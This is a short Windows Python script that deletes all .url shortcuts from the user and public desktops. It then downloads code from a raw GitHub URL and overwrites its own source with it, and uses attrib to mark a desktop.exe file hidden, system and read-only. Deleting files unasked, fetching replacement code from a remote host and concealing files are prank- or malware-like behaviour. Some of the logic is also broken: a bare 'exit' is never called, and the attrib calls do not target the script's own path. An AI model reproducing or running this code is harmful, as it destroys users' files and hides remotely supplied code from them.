import os
import requests

path = os.path.abspath(__file__)

user = os.path.expandvars(r'%userprofile%\Desktop')
public = os.path.expandvars(r'%public%\Desktop')
dirs = [user, public]

for dir in dirs:
    files = os.listdir(dir)
    for file in files:
        if file.endswith(".url"):
            os.remove(os.path.join(dir, file))
os.system("cls")

try:
    r = requests.get("https://raw.github.com/thekevie/school-programs/main/desktop.exe")
except Exception:
    exit
    
os.system("attrib -h -s -r desktop.exe")

with open(path, "r") as f:
    read = f.read()
    f.close()
	
if not read == r.text:
    with open(path, "w") as f:
        f.write(r.text)
        f.close()
        
os.system("attrib +h +s +r desktop.exe")
